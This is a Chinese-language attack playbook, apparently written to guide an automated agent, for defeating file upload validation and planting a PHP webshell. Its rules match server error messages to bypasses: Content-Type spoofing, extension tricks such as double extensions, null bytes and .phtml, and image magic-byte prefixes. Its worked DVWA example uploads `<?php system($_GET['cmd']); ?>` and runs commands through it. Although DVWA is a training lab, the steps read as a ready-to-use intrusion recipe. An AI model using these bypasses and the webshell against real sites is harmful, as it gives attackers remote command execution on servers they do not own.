# 文件上传类型校验绕过判定

## 什么信号 → 怎么做

- 上传点报错仅提到 `type`、`Content-Type`、`image/jpeg`、`image/png`、`MIME`，且未提到扩展名或文件内容非法 → 服务端只校验 multipart 中 file part 的 Content-Type。做法：文件名保持 `.php`，把 file part 的 Content-Type 改为允许值（如 image/jpeg），文件内容用 PHP webshell。
- 上传成功后响应给出保存路径，且文件名保留 `.php` 或可执行后缀 → 目标会把该文件当脚本解析，直接访问路径执行命令，不要输出 HTML/JS payload（如 `<img src=x onerror=alert(1)>`）。
- 错误消息含 `size` 或 `too large` → 控制 payload 总体积小于限制值（常见 <100000），使用精简命令执行体。
- 错误消息含 `extension`、`only JPG/PNG` 或要求扩展名 → 不能只改 Content-Type，先过扩展名分支：大小写、双扩展名、点/空格/空字节（PHP 兼容环境）、替代脚本后缀 `.php5`/`.phtml`/`.pht`。
- 服务端校验文件内容（提示“not an image”或“contents”），或上传后访问时 PHP 无法解析 → 在 PHP 代码前加对应文件魔数头：JPEG `FFD8FFE0`；PNG `89504E47`；GIF `GIF89a`。文件头只要能通过内容校验即可，后面直接跟 PHP。

## 决策步骤

1. 先正常上传一个合法图片或最小文件，读响应，记录错误/成功消息。
2. 判断校验类型：
   - 仅 Content-Type：改 file part 的 Content-Type。
   - 扩展名校验：先尝试可执行扩展名或大小写/双扩展名绕过，再配合 Content-Type。
   - 内容校验：在负载前加魔数头。
   - 大小校验：缩短 payload。
   - 无校验但上传成功：直接访问返回的路径。
3. 修改后的 multipart 请求必须把 `Content-Type: image/jpeg` 放在 file part 的子头部，不是最外层请求头。
4. 上传成功后访问 `<上传路径>/<文件名.php>?cmd=id`；若返回 500 或无法解析，尝试把 PHP 标签前置、使用短标签，或去掉多余文件头。
5. 若响应未返回路径，尝试常见上传目录：`/hackable/uploads/`、`/uploads/`、`/upload/`、`/images/`、`/media/`；若文件名被随机化，从响应中找新文件名，无法获取时改用文件包含或路径泄露。

## 最小示例

- 信号：DVWA medium 报错只提示 `image/jpeg|image/png`，上传目录 `/hackable/uploads/` 可见且文件名保留 `.php`。
- 做法：multipart 文件字段 `uploaded`，文件名 `cmd.php`；file part 的 Content-Type 设为 `image/jpeg`；内容 = JPEG 魔数头（`FFD8FFE0...`）+ `<?php system($_GET['cmd']); ?>`。上传后访问 `/hackable/uploads/cmd.php?cmd=id`。